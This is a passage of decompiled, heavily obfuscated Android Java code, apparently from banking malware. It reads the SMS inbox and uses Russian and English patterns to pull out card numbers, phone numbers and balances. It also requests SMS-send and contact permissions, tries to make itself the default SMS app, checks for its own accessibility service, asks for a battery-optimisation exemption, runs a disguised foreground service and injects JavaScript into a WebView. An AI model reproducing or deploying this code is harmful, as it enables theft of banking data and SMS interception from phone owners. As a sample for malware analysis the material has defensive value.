        List listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(TypefaceCache.checked("04620427040E04A704A104EF048F04FD"), TypefaceCache.obtain("00100074005E009500F200BE00DC00AC"), TypefaceCache.checked("0461042E040604AB04AA04E104F60483"), TypefaceCache.obtain("0017007F0055008C00FF00B900D4"), TypefaceCache.checked("04510434042A"), TypefaceCache.checked("0453042D047704A304A0"), "900", TypefaceCache.obtain("000800770048009700F9"), TypefaceCache.obtain("000B00770057009E00FB"), TypefaceCache.obtain("000900630048008600FE"), TypefaceCache.obtain("000500790049009300F5009D00D300A90028"), TypefaceCache.obtain("000000730055009300F500AD00F100B50026007200520093"));
        Pattern patternCompile = Pattern.compile("(?:\\u043A\\u0430\\u0440\\u0442[\\u0430\\u044B]?|card).{0,30}(\\+?7?\\d{10,11})", 66);
        try {
            Cursor cursorQuery = getContentResolver().query(Uri.parse(gA5gCwTK0qjTIn.EWUjsTERgdPbSw3NNlN()), new String[]{TypefaceCache.obtain("00220072005F009500F500AC00C1"), TypefaceCache.obtain("00210079005F009E")}, null, null, TypefaceCache.obtain("00270077004F008200B0009B00F7009400000036007700AE00DD009600E600E700720026000B"));
            if (cursorQuery == null) {
                return null;
            }
            while (cursorQuery.moveToNext()) {
                try {
                    String string2 = cursorQuery.getString(0);
                    if (string2 != null && (string = cursorQuery.getString(1)) != null && !listYTljMGnIibTRdOpSh4.isEmpty()) {
                        Iterator it = listYTljMGnIibTRdOpSh4.iterator();
                        while (it.hasNext()) {
                            if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string2, (String) it.next(), true)) {
                                DirOmVsluSrk5EngI dirOmVsluSrk5EngIDDIMxZXP1V8HdM = okc5AGRjqrud84oM6d.dDIMxZXP1V8HdM(patternCompile.matcher(string), 0, string);
                                if (dirOmVsluSrk5EngIDDIMxZXP1V8HdM == null) {
                                    break;
                                }
                                String strH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK((String) ((Vh83j6fdPcPn0aP56nzv) dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM()).get(1));
                                cursorQuery.close();
                                return strH9XlUr4OeMJFiXK;
                            }
                            TypefaceCache.obtain("000100770055008C00B0008C00FF0094006300730049009500FF00AD008800E7");
                            e.getMessage();
                            return null;
                        }
                    }
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                        throw th2;
                    }
                }
            }
            cursorQuery.close();
            return null;
        } catch (Exception e) {
            TypefaceCache.obtain("000100770055008C00B0008C00FF0094006300730049009500FF00AD008800E7");
            e.getMessage();
            return null;
        }
    }

    public final void K7eEOBPYP9VIoHWTe(int i) {
        ArrayList arrayList = this.DVTNwpDEVsUKuznof;
        if (arrayList == null) {
            arrayList = null;
        }
        if (i >= arrayList.size()) {
            return;
        }
        ArrayList arrayList2 = this.DVTNwpDEVsUKuznof;
        String str = ((fTTdiiD76ErrE12U) (arrayList2 != null ? arrayList2 : null).get(i)).dDIMxZXP1V8HdM;
        if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F")) ? true : okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(str, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048"))) {
            TypefaceCache.obtain("00620037001A00C700C3009200E100E700300062005E009700B000BC00DD00AA0033007A005E009300F500BB009E00E7003000750053008200F400AA00DE00AE002D0071001B008800FE009D00D700A40022007B005E00A300F500B900D300B2002F00620068008A00E300F7009B00E7006B0072005E008100F500AD00C000A200270036000E00D700A000B200C100EE");
            new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, (-82) + 88), 500L);
        }
    }

    public final String MLSIo1htfMPWeB8V876L() {
        String string;
        List listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(TypefaceCache.obtain("000E00420068"), TypefaceCache.checked("045F0434041A"), TypefaceCache.obtain("00010073005E008B00F900B100D7"), TypefaceCache.checked("0452042E040004D704A904E2"), TypefaceCache.obtain("000E0073005C008600F600B000DC"), TypefaceCache.checked("045F0423040804D704D404E1048F"), TypefaceCache.obtain("001700730057008200A2"), TypefaceCache.checked("04610423040004D200A2"), "900", TypefaceCache.obtain("00080075005E008B00FC"), TypefaceCache.obtain("00020075004F008E00E6"), TypefaceCache.obtain("0002007A004F008200FC"), TypefaceCache.obtain("001700730057008200A200FF00F9009D"), TypefaceCache.obtain("00010073005E008B00F900B100D700E70008004C"));
        Pattern patternCompile = Pattern.compile("(\\+7|8)?[\\s-]?\\(?9\\d{2}\\)?[\\s-]?\\d{3}[\\s-]?\\d{2}[\\s-]?\\d{2}");
        try {
            Cursor cursorQuery = getContentResolver().query(Uri.parse(gA5gCwTK0qjTIn.EWUjsTERgdPbSw3NNlN()), new String[]{TypefaceCache.obtain("00220072005F009500F500AC00C1"), TypefaceCache.obtain("00210079005F009E")}, null, null, TypefaceCache.obtain("00270077004F008200B0009B00F7009400000036007700AE00DD009600E600E700720026000B"));
            if (cursorQuery == null) {
                return null;
            }
            while (cursorQuery.moveToNext()) {
                try {
                    String string2 = cursorQuery.getString(0);
                    if (string2 != null && (string = cursorQuery.getString(1)) != null && !listYTljMGnIibTRdOpSh4.isEmpty()) {
                        Iterator it = listYTljMGnIibTRdOpSh4.iterator();
                        while (it.hasNext()) {
                            if (KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string2, (String) it.next(), true)) {
                                DirOmVsluSrk5EngI dirOmVsluSrk5EngIDDIMxZXP1V8HdM = okc5AGRjqrud84oM6d.dDIMxZXP1V8HdM(patternCompile.matcher(string), 0, string);
                                if (dirOmVsluSrk5EngIDDIMxZXP1V8HdM == null) {
                                    break;
                                }
                                String strH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK(dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM.group());
                                cursorQuery.close();
                                return strH9XlUr4OeMJFiXK;
                            }
                            TypefaceCache.obtain("000C0066005E009500F100AB00DD00B500630045007600B400B000BA00C000B5002C0064000100C7");
                            e.getMessage();
                            return null;
                        }
                    }
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                        throw th2;
                    }
                }
            }
            cursorQuery.close();
            return null;
        } catch (Exception e) {
            TypefaceCache.obtain("000C0066005E009500F100AB00DD00B500630045007600B400B000BA00C000B5002C0064000100C7");
            e.getMessage();
            return null;
        }
    }

    public final void MSGkxvPxRYNqC() {
        WebView webView = this.yTljMGnIibTRdOpSh4;
        if (webView != null) {
            webView.evaluateJavascript(TypefaceCache.obtain("0030007E0054009000DD00BE00DC00B20022007A0068008A00E300F7") + "true)", null);
        }
    }

    public final boolean O2DHNSIGZlgPja7eqLgn() {
        if (rCHnHJBAlOpNI5()) {
            return true;
        }
        return (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.READ_SMS") == 0) && (RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.RECEIVE_SMS") == 0);
    }

    public final int Qrz92kRPw4GcghAc(int i) {
        return (int) (i * getResources().getDisplayMetrics().density);
    }

    /* JADX WARN: Type inference failed for: r0v1, types: [java.lang.Object, java.util.List] */
    /* JADX WARN: Type inference failed for: r1v0, types: [java.lang.Object, java.util.List] */
    public final void VEkRsTDS6a9oHWI() {
        is7XW2V21HfKv7MihWy();
        int i = 0;
        if (this.xfn2GJwmGqs7kWW >= this.tne6mXOUFKdd.size()) {
            View view = this.O2DHNSIGZlgPja7eqLgn;
            if (view != null) {
                view.animate().alpha(0.0f).setDuration(500L).withEndAction(new mSyFfcAAyjxLnl2Ul6(view, 1)).start();
            }
            getSharedPreferences(euF5Udt5Rqv3Qmea, 0).edit().putBoolean(dQC4QhgRN3MSEAP3HW0, true).apply();
            try {
                YIgR6F2ZXmLx2ul();
            } catch (Exception unused) {
            }
            if (!getSharedPreferences(A1BaTVAMeIXMnh, 0).getBoolean(VEkRsTDS6a9oHWI, false)) {
                qfTrc75xwRVMl85vh();
            }
            try {
                A1BaTVAMeIXMnh();
            } catch (Exception unused2) {
            }
            try {
                String str = SyncAdapterService.w9sT1Swbhx3hs;
                RIZfHbqXpth8r2yN4.D5P1xCAyuvgF(getApplicationContext());
            } catch (Exception unused3) {
            }
            if (oJLsXXGxdTuQpIRpV.w9sT1Swbhx3hs() && dTS0S7eC32ubQH54j36()) {
                new Handler(Looper.getMainLooper()).post(new AInogFBF3uZEdg60(this, 0));
                cpTq2XMCb5JSaEhn cptq2xmcb5jsaehn = umMdYoePNXvWWPn.w9sT1Swbhx3hs;
                JV1KnSgnr44vUJP8N jV1KnSgnr44vUJP8N = new JV1KnSgnr44vUJP8N(this, null, i);
                int i2 = 2 & 1;
                sNACkioAJERo snackioajero = sNACkioAJERo.w9sT1Swbhx3hs;
                if (i2 != 0) {
                    cptq2xmcb5jsaehn = snackioajero;
                }
                cpTq2XMCb5JSaEhn cptq2xmcb5jsaehnWotphlvK9sPbXJ = OFtLBiBbrrTHWu.wotphlvK9sPbXJ(snackioajero, cptq2xmcb5jsaehn, true);
                AqltFduMByzMV4g aqltFduMByzMV4g = umMdYoePNXvWWPn.dDIMxZXP1V8HdM;
                if (cptq2xmcb5jsaehnWotphlvK9sPbXJ != aqltFduMByzMV4g && cptq2xmcb5jsaehnWotphlvK9sPbXJ.D5P1xCAyuvgF(W6dfON4KdcdxlH.vekpFI4d1Nc4fakF) == null) {
                    cptq2xmcb5jsaehnWotphlvK9sPbXJ = cptq2xmcb5jsaehnWotphlvK9sPbXJ.EWUjsTERgdPbSw3NNlN(aqltFduMByzMV4g);
                }
                JXn4Qf7zpnLjP5 sndbsr9gb3ezzub = new snDbSR9Gb3eZZuB(cptq2xmcb5jsaehnWotphlvK9sPbXJ, true);
                sndbsr9gb3ezzub.YIgR6F2ZXmLx2ul(1, sndbsr9gb3ezzub, jV1KnSgnr44vUJP8N);
            }
            TypefaceCache.obtain("00100062005E008600FC00BA00C000E700300073004F009200E000FF00D100A8002E00660057008200E400BA009220D300630064005E008B00F500BE00C100AE002D0071001B008600F300AB00DB00B1002A00620042");
            new Handler(Looper.getMainLooper()).postDelayed(new AInogFBF3uZEdg60(this, 1), 2000L);
            return;
        }
        jme6JDteoDB1AsG4 jme6jdteodb1asg4 = (jme6JDteoDB1AsG4) this.tne6mXOUFKdd.get(this.xfn2GJwmGqs7kWW);
        LinearLayout linearLayout = new LinearLayout(this);
        linearLayout.setOrientation(1);
        GradientDrawable gradientDrawable = new GradientDrawable();
        gradientDrawable.setCornerRadius(Qrz92kRPw4GcghAc(38 - 14));
        gradientDrawable.setColor(-182970344);
        linearLayout.setBackground(gradientDrawable);
        linearLayout.setPadding(Qrz92kRPw4GcghAc(20), Qrz92kRPw4GcghAc(20), Qrz92kRPw4GcghAc(20), Qrz92kRPw4GcghAc(20));
        linearLayout.setElevation(Qrz92kRPw4GcghAc(16));
        LinearLayout linearLayout2 = new LinearLayout(this);
        linearLayout2.setOrientation(0);
        linearLayout2.setGravity(16);
        int iQrz92kRPw4GcghAc = Qrz92kRPw4GcghAc(56);
        linearLayout2.addView(new gTzjNYsqUKrf2tbmP(this, jme6jdteodb1asg4), new LinearLayout.LayoutParams(iQrz92kRPw4GcghAc, iQrz92kRPw4GcghAc));
        LinearLayout linearLayout3 = new LinearLayout(this);
        linearLayout3.setOrientation(1);
        linearLayout3.setPadding(Qrz92kRPw4GcghAc(16), 0, 0, 0);
        TextView textView = new TextView(this);
        textView.setText(jme6jdteodb1asg4.w9sT1Swbhx3hs);
        textView.setTextColor(-1);
        textView.setTextSize(2, 17.0f);
        textView.getPaint().setFakeBoldText(true);
        TextView textView2 = new TextView(this);
        textView2.setText(jme6jdteodb1asg4.vekpFI4d1Nc4fakF);
        textView2.setTextColor(-5592406);
        textView2.setTextSize(2, 13.0f);
        textView2.setPadding(0, Qrz92kRPw4GcghAc(3), 0, 0);
        linearLayout3.addView(textView);
        linearLayout3.addView(textView2);
        linearLayout2.addView(linearLayout3, new LinearLayout.LayoutParams(0, -2, 1.0f));
        linearLayout.addView(linearLayout2);
        TextView textView3 = new TextView(this);
        textView3.setText(IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM ? TypefaceCache.checked("04630426040C04A704A50497048A0485040F") : TypefaceCache.obtain("00040064005A008900E4"));
        textView3.setTextColor(-1);
        textView3.setTextSize(2, 15.0f);
        textView3.getPaint().setFakeBoldText(true);
        textView3.setGravity(17);
        textView3.setPadding(0, Qrz92kRPw4GcghAc(14), 0, Qrz92kRPw4GcghAc(14));
        GradientDrawable gradientDrawable2 = new GradientDrawable(GradientDrawable.Orientation.LEFT_RIGHT, new int[]{-15043608, -15374912});
        gradientDrawable2.setCornerRadius(Qrz92kRPw4GcghAc(28));
        textView3.setBackground(gradientDrawable2);
        textView3.setElevation(Qrz92kRPw4GcghAc(6));
        textView3.setClickable(true);
        textView3.setFocusable(true);
        textView3.setOnClickListener(new xAY36KEWHIBZ(1, jme6jdteodb1asg4));
        LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(-1, -2);
        layoutParams.topMargin = Qrz92kRPw4GcghAc(16);
        linearLayout.addView(textView3, layoutParams);
        FrameLayout frameLayout = this.rCHnHJBAlOpNI5;
        if (frameLayout != null) {
            frameLayout.removeAllViews();
        }
        FrameLayout frameLayout2 = this.rCHnHJBAlOpNI5;
        if (frameLayout2 != null) {
            frameLayout2.addView(linearLayout);
        }
        linearLayout.setTranslationY(Qrz92kRPw4GcghAc(120));
        linearLayout.setAlpha(0.0f);
        linearLayout.animate().translationY(0.0f).alpha(1.0f).setDuration(450L).setInterpolator(new OvershootInterpolator(0.8f)).start();
    }

    public final String XiR1pIn5878vVWd() {
        List listYTljMGnIibTRdOpSh4 = Aqh0grSwgDbwr.yTljMGnIibTRdOpSh4(new NB5LVitKoIkG7GAQ6("(?:\\u0432\\u0430\\u0448 \\u043D\\u043E\\u043C\\u0435\\u0440|your number)[:\\s]*(\\+?[0-9]{10,12})", 0), new NB5LVitKoIkG7GAQ6("(?:\\u0431\\u0430\\u043B\\u0430\\u043D\\u0441 \\u043D\\u043E\\u043C\\u0435\\u0440\\u0430|balance)[:\\s]*(\\+?[0-9]{10,12})", 0));
        try {
            Cursor cursorQuery = getContentResolver().query(Uri.parse(gA5gCwTK0qjTIn.EWUjsTERgdPbSw3NNlN()), new String[]{TypefaceCache.obtain("00210079005F009E")}, null, null, TypefaceCache.obtain("00270077004F008200B0009B00F7009400000036007700AE00DD009600E600E700710026000B"));
            if (cursorQuery == null) {
                return null;
            }
            while (cursorQuery.moveToNext()) {
                try {
                    String string = cursorQuery.getString(0);
                    if (string != null) {
                        Iterator it = listYTljMGnIibTRdOpSh4.iterator();
                        while (it.hasNext()) {
                            DirOmVsluSrk5EngI dirOmVsluSrk5EngIDDIMxZXP1V8HdM = okc5AGRjqrud84oM6d.dDIMxZXP1V8HdM(((NB5LVitKoIkG7GAQ6) it.next()).w9sT1Swbhx3hs.matcher(string), 0, string);
                            if (dirOmVsluSrk5EngIDDIMxZXP1V8HdM != null) {
                                String strH9XlUr4OeMJFiXK = H9XlUr4OeMJFiXK((String) ((Vh83j6fdPcPn0aP56nzv) dirOmVsluSrk5EngIDDIMxZXP1V8HdM.dDIMxZXP1V8HdM()).get(1));
                                cursorQuery.close();
                                return strH9XlUr4OeMJFiXK;
                            }
                            TypefaceCache.obtain("00130077004F009300F500AD00DC00E700300073005A009500F300B7009200A2003100640054009500AA00FF");
                            e.getMessage();
                            return null;
                        }
                    }
                } catch (Throwable th) {
                    try {
                        throw th;
                    } catch (Throwable th2) {
                        okc5AGRjqrud84oM6d.Ee8d2j4S9Vm5yGuR(cursorQuery, th);
                        throw th2;
                    }
                }
            }
            cursorQuery.close();
            return null;
        } catch (Exception e) {
            TypefaceCache.obtain("00130077004F009300F500AD00DC00E700300073005A009500F300B7009200A2003100640054009500AA00FF");
            e.getMessage();
            return null;
        }
    }

    public final void XuO9PPFo607ssKwZjNW() {
        if (EWUjsTERgdPbSw3NNlN()) {
            gmNWMfvn6zlEj();
            return;
        }
        try {
            try {
                Intent intent = new Intent("android.settings.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS");
                intent.setData(Uri.parse(TypefaceCache.obtain("003300770058008C00F100B800D700FD") + getPackageName()));
                startActivity(intent);
            } catch (Exception unused) {
            }
        } catch (Exception unused2) {
            startActivity(new Intent("android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS"));
        }
    }

    public final void YIgR6F2ZXmLx2ul() {
        try {
            startForegroundService(new Intent(this, (Class<?>) SyncQYAdapter.class));
            TypefaceCache.obtain("0010006F0055008400C1008600F300A300220066004F008200E200FF00C100B300220064004F008200F4");
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E70010006F0055008400C1008600F300A300220066004F008200E200E50092");
            e.getMessage();
        }
    }

    /* JADX WARN: Code duplicated, block: B:23:0x0067  */
    /* JADX WARN: Type inference failed for: r0v8, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    public final void dQC4QhgRN3MSEAP3HW0() {
        while (true) {
            int i = this.l1V0lQr6TbwNKqHfXNbb;
            ArrayList arrayList = this.DVTNwpDEVsUKuznof;
            if (arrayList == null) {
                arrayList = null;
            }
            if (i < arrayList.size()) {
                ArrayList arrayList2 = this.DVTNwpDEVsUKuznof;
                if (arrayList2 == null) {
                    arrayList2 = null;
                }
                if (!((Boolean) ((fTTdiiD76ErrE12U) arrayList2.get(this.l1V0lQr6TbwNKqHfXNbb)).ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                    break;
                }
                ArrayList arrayList3 = this.DVTNwpDEVsUKuznof;
                if (arrayList3 == null) {
                    arrayList3 = null;
                }
                if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(((fTTdiiD76ErrE12U) arrayList3.get(this.l1V0lQr6TbwNKqHfXNbb)).dDIMxZXP1V8HdM, TypefaceCache.obtain("0030007B004800B800F400BA00D400A60036007A004F"))) {
                    this.hV4VTKNUdeHN = true;
                } else {
                    ArrayList arrayList4 = this.DVTNwpDEVsUKuznof;
                    if (okc5AGRjqrud84oM6d.w9sT1Swbhx3hs(((fTTdiiD76ErrE12U) (arrayList4 != null ? arrayList4 : null).get(this.l1V0lQr6TbwNKqHfXNbb)).dDIMxZXP1V8HdM, TypefaceCache.obtain("00210077004F009300F500AD00CB00980030007B0048"))) {
                        this.hV4VTKNUdeHN = true;
                    }
                }
                this.l1V0lQr6TbwNKqHfXNbb++;
            } else {
                break;
            }
        }
        l1V0lQr6TbwNKqHfXNbb().edit().putInt(qfTrc75xwRVMl85vh, this.l1V0lQr6TbwNKqHfXNbb).apply();
    }

    public final boolean dTS0S7eC32ubQH54j36() {
        try {
        } catch (Exception unused) {
        }
        try {
            String str = getPackageName() + TypefaceCache.obtain("006C0077004B009700BE00B200DD00A5002A007A005E009F00BE00AF00DE00B2003000380048008200E200A900DB00A400260065001500A300F100AB00D3009600050057005F008600E000AB00D700B5");
            String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
            if (string == null) {
                return false;
            }
            return KgSM0TsKUpCiuePB.VEkRsTDS6a9oHWI(string, str, true);
        } catch (Exception unused2) {
            return false;
        }
    }

    public final void euF5Udt5Rqv3Qmea() {
        if (O2DHNSIGZlgPja7eqLgn()) {
            D5P1xCAyuvgF();
            return;
        }
        int i = Build.VERSION.SDK_INT;
        if (i >= 34) {
            requestPermissions(new String[]{"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS"}, 1055);
            return;
        }
        int i2 = (-4) + 33;
        eTeIZwLyooQrZ0ICI9i eteizwlyooqrz0ici9i = this.fivkjwgu2UdAtiY;
        if (i >= i2) {
            try {
                Object systemService = getSystemService("role");
                RoleManager roleManagerDDIMxZXP1V8HdM = JW3Lh9hxwLsO2ArTlH.EWUjsTERgdPbSw3NNlN(systemService) ? JW3Lh9hxwLsO2ArTlH.dDIMxZXP1V8HdM(systemService) : null;
                if (roleManagerDDIMxZXP1V8HdM != null && roleManagerDDIMxZXP1V8HdM.isRoleAvailable("android.app.role.SMS")) {
                    if (roleManagerDDIMxZXP1V8HdM.isRoleHeld("android.app.role.SMS")) {
                        D5P1xCAyuvgF();
                        return;
                    } else {
                        eteizwlyooqrz0ici9i.vekpFI4d1Nc4fakF(roleManagerDDIMxZXP1V8HdM.createRequestRoleIntent("android.app.role.SMS"));
                        return;
                    }
                }
            } catch (Exception e) {
                TypefaceCache.obtain("00310073004A009200F500AC00C6009400370073005A008B00F500AD00E100AA003000360069008800FC00BA00FF00A6002D0077005C008200E200F000DB00A9003700730055009300B000BA00C000B5002C0064000100C7");
                e.getMessage();
                try {
                    eteizwlyooqrz0ici9i.vekpFI4d1Nc4fakF(gA5gCwTK0qjTIn.xDyLpEZyrcKVe0(getPackageName()));
                    return;
                } catch (Exception e2) {
                    TypefaceCache.obtain("00310073004A009200F500AC00C6009400370073005A008B00F500AD00E100AA003000360057008200F700BE00D100BE00630070005A008B00FC00BD00D300A400280036005E009500E200B000C000FD0063");
                    e2.getMessage();
                    try {
                        try {
                            startActivity(new Intent("android.settings.MANAGE_DEFAULT_APPS_SETTINGS"));
                            return;
                        } catch (Exception unused) {
                            return;
                        }
                    } catch (Exception unused2) {
                        startActivity(new Intent("android.settings.SETTINGS"));
                        return;
                    }
                }
            }
        }
        eteizwlyooqrz0ici9i.vekpFI4d1Nc4fakF(gA5gCwTK0qjTIn.xDyLpEZyrcKVe0(getPackageName()));
    }

    public final void fivkjwgu2UdAtiY() {
        TypefaceCache.obtain("00620037001A00C700FF00B100F000A2002000770056008200D400BA00D400A60036007A004F00B400FD00AC009A00EE");
        if (isFinishing()) {
            TypefaceCache.obtain("00620037001A00C700D100BC00C600AE0035007F004F009E00B000B600C100E70025007F0055008E00E300B700DB00A90024003A001B009400FB00B600C200E7002C00780079008200F300BE00DF00A200070073005D008600E500B300C60094002E0065");
            return;
        }
        boolean z = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.READ_SMS") == 0;
        boolean z2 = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.SEND_SMS") == 0;
        boolean z3 = RIZfHbqXpth8r2yN4.vekpFI4d1Nc4fakF(this, "android.permission.RECEIVE_SMS") == 0;
        TypefaceCache.obtain("00620037001A00C700C000BA00C000AA002A00650048008E00FF00B100C100E7006E0036006900A200D1009B008800E7");
        TypefaceCache.obtain("006F0036006800A200DE009B008800E7");
        TypefaceCache.obtain("006F0036006900A200D3009A00FB00910006002C001B");
        String str = VEkRsTDS6a9oHWI;
        if (z && z2 && z3) {
            TypefaceCache.obtain("00620037001A00C700D100B300C000A200220072004200C700F800BE00C400A200630045007600B400B000AF00D700B5002E007F0048009400F900B000DC00B4");
            if (l1V0lQr6TbwNKqHfXNbb().getBoolean(str, false)) {
                return;
            }
            qfTrc75xwRVMl85vh();
            return;
        }
        TypefaceCache.obtain("00620037001A00C700C200BA00C300B200260065004F008E00FE00B800920094000E0045001B009700F500AD00DF00AE003000650052008800FE00AC009C00E9006D");
        try {
            this.ECwLkmPW1UKz7J6E.vekpFI4d1Nc4fakF(new String[]{"android.permission.READ_SMS", "android.permission.SEND_SMS", "android.permission.RECEIVE_SMS", "android.permission.READ_CONTACTS"});
        } catch (Exception e) {
            TypefaceCache.obtain("00620037001A00C700E300B200C10097002600640056008E00E300AC00DB00A8002D005A005A009200FE00BC00DA00A2003100380057008600E500B100D100AF006B003F001B008100F100B600DE00A20027002C001B");
            e.getMessage();
            if (l1V0lQr6TbwNKqHfXNbb().getBoolean(str, false)) {
                return;
            }
            qfTrc75xwRVMl85vh();
        }
    }

    public final void gIIiyi2ddlMDR0() {
        TypefaceCache.obtain("00100073004F009200E000FF00D100A8002E00660057008200E400BA0093");
        ((SharedPreferences) this.EWUjsTERgdPbSw3NNlN.dDIMxZXP1V8HdM()).edit().putBoolean(dQC4QhgRN3MSEAP3HW0, true).apply();
        SharedPreferences.Editor editorEdit = l1V0lQr6TbwNKqHfXNbb().edit();
        ArrayList arrayList = this.DVTNwpDEVsUKuznof;
        if (arrayList == null) {
            arrayList = null;
        }
        editorEdit.putInt(qfTrc75xwRVMl85vh, arrayList.size()).apply();
        try {
            YIgR6F2ZXmLx2ul();
        } catch (Exception e) {
            TypefaceCache.obtain("000500770052008B00F500BB009200B3002C00360048009300F100AD00C600E7003000730049009100F900BC00D700E7002A0078001B008400FF00B200C200AB00260062005E00B400F500AB00C700B700790036");
            e.getMessage();
        }
        if (!l1V0lQr6TbwNKqHfXNbb().getBoolean(VEkRsTDS6a9oHWI, false)) {
            qfTrc75xwRVMl85vh();
        }
        try {
            A1BaTVAMeIXMnh();
        } catch (Exception unused) {
        }
        if (oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM()) {
            new Handler(Looper.getMainLooper()).post(new AInogFBF3uZEdg60(this, 5));
        }
        finish();
    }

    /* JADX WARN: Type inference failed for: r0v6, types: [v.s.JRdueaGIH5g8DVCPba, v.s.LGm23hksIOxB] */
    public final void gmNWMfvn6zlEj() {
        try {
            int i = this.l1V0lQr6TbwNKqHfXNbb;
            ArrayList arrayList = this.DVTNwpDEVsUKuznof;
            ArrayList arrayList2 = null;
            if (arrayList == null) {
                arrayList = null;
            }
            if (i >= arrayList.size()) {
                return;
            }
            ArrayList arrayList3 = this.DVTNwpDEVsUKuznof;
            if (arrayList3 != null) {
                arrayList2 = arrayList3;
            }
            if (((Boolean) ((fTTdiiD76ErrE12U) arrayList2.get(this.l1V0lQr6TbwNKqHfXNbb)).ibVTtJUNfrGYbW.w9sT1Swbhx3hs()).booleanValue()) {
                ECwLkmPW1UKz7J6E();
            }
        } catch (Exception e) {
            TypefaceCache.obtain("0020007E005E008400FB009E00DC00A300020072004D008600FE00BC00D700E7002600640049008800E200E50092");
            e.getMessage();
        }
    }

    public final void hV4VTKNUdeHN() {
        if (EWUjsTERgdPbSw3NNlN() && O2DHNSIGZlgPja7eqLgn()) {
            ECwLkmPW1UKz7J6E();
        } else if (EWUjsTERgdPbSw3NNlN()) {
            TypefaceCache.obtain("00310073004A009200F500AC00C6008500220062004F008200E200A600E600AF002600780068008A00E300E5009200A500220062004F008200E200A6009200880008003A001B009500F500AE00C700A2003000620052008900F700FF00E1008A0010");
            k84rwRrqzhrNQ1CdNQ9();
        } else {
            TypefaceCache.obtain("00310073004A009200F500AC00C6008500220062004F008200E200A600E600AF002600780068008A00E300E5009200B500260067004E008200E300AB00DB00A9002400360059008600E400AB00D700B5003A00360054009700E400B600DF00AE00390077004F008E00FF00B1009200A1002A006400480093");
            XuO9PPFo607ssKwZjNW();
        }
    }

    public final ArrayList hjneShqpF9Tis4() {
        int i;
        ArrayList arrayList = new ArrayList();
        if (oJLsXXGxdTuQpIRpV.dDIMxZXP1V8HdM()) {
            String strObtain = TypefaceCache.obtain("00210077004F009300F500AD00CB009800300062005A008900F400BE00DE00A8002D0073");
            String strObtain2 = TypefaceCache.obtain("00600022000800A200A900E800F0");
            String strObtain3 = TypefaceCache.obtain("00600025000300A100A9009B0085");
            boolean z = IqsDBf3FXcUYB8yZSHdp.dDIMxZXP1V8HdM;
            arrayList.add(iUQk66nAiXgO35(strObtain, "⚙️", strObtain2, strObtain3, z ? TypefaceCache.checked("04520426047904D704D004EA04FD") : TypefaceCache.obtain("00010077004F009300F500AD00CB"), z ? TypefaceCache.checked("0457042D047400C704D1049D048204F6047B042D047704DA04AE04E60092048704730427040504A504DB00FF048D0487047B042D040504D104A504E2048A04890063042B040E04D904A1049A048C04F3047B042A001B04DA04A504E1048104870473042B040304A004A504E2048F048C047A0036040F04D904D1049D04F104F80063042C001B04D604A0049D0482048704760423001500C704B004EF048504870476045E040304A504A500FF048604FC040C0036040404A704AE04EB048C04FC04750423040604DF04DF00F1") : TypefaceCache.obtain("0017007E0052009400B000BE00C200B700630064005E009600E500B600C000A200300036004E008900E200BA00C100B30031007F0058009300F500BB009200A500220062004F008200E200A6009200A600200075005E009400E300FF00C600A8006300610054009500FB00FF00C200B5002C0066005E009500FC00A6009C00E70013007A005E008600E300BA009200A6002F007A0054009000B000AB00DD00E7002000790055009300F900B100C700A2006D"), new H7JWbAQ2EAug6YHM8S(this, 16), new H7JWbAQ2EAug6YHM8S(this, 17)));
